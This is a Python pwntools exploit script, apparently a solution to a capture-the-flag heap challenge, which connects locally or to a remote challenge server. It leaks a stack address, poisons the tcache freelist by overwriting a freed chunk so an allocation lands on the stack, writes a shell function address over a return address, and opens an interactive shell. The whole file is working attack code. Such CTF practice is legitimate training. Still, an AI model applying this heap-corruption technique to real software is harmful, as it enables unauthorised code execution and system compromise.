from pwn import *
from NAUP_pwn_lib import *
import time

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()
def tsl(): return time.sleep(0.2)

context(arch = 'amd64', os = 'linux')
REMOTE_LOCAL=input("local?(y/n):")

if REMOTE_LOCAL=="y":
    r=process('./chal')
    debug_init()
    
else:                                           
    REMOTE_INFO=split_nc("nc 210.70.89.109 20006")
    REMOTE_IP=REMOTE_INFO[0]
    REMOTE_PORT=int(REMOTE_INFO[1])

    r=remote(REMOTE_IP,REMOTE_PORT)

# p_c(r,'b *0x401752')

### heap I/O
def create1(size):
    sla(b'#',b'1')
    sla(b'size:',str(size).encode())

def create2(size):
    sla(b'#',b'2')
    sla(b'size',str(size).encode())

def get(index):
    sla(b'#',b'3')
    sla(b'idx:',str(index).encode())
    rcu(b']: ')
    rec=rcl().strip()
    #print(rec)
    return rec

def set(index, chunkstr):
    sla(b'#',b'4')
    sla(b'idx:',str(index).encode())
    sa(b'str',chunkstr)

def delete(index):
    sla(b'#',b'5')
    sla(b'idx:' , str(index).encode())


### exploit

rcu(b"gift: ")
stack_var=int(rcl().strip(),16)

print("NAUPINFO @ STACK: ",hex(stack_var))

create1(0x60) # idx 0
create1(0x60) # idx 1

delete(0)
delete(1)

addr=p64(stack_var)

set(1,addr)

create1(0x60) # idx 2
create1(0x60) # idx 3

shell_addr=0x401236+0x5
set(3,b'a'*0x10+p64(shell_addr))

sla(b'#',b'6')

###
ita()